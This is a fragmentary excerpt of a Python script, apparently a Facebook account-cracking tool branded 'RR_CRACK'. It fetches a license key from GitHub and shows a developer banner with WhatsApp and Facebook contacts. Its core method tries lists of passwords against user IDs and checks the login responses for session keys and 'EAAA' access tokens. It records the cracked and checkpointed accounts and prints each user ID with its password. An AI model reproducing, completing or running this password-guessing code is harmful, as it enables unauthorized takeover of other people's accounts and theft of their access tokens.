...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> 01710375092")
	subprocess.check_output(["am", "start", "https://wa.me/+8801710375092"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Riyad-RR-Hacker/text/main/Eid%201').text
			if basesplit in plr:
				key = basesplit
...
\033[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            RR-RIYAD
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Abubockor Riyad
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01710375092
     \033[1;96m➣ \033[1;92mGITHUB     :            RR-Hacker-Riyad
...
\033[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RR_CRACK] : %s/%s -> \033[0;92m [ RR-OK:%s ]- \033[0;93m[RR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[RR-CP😭] %s|%s\033[0;97m         "%(uid, pw))
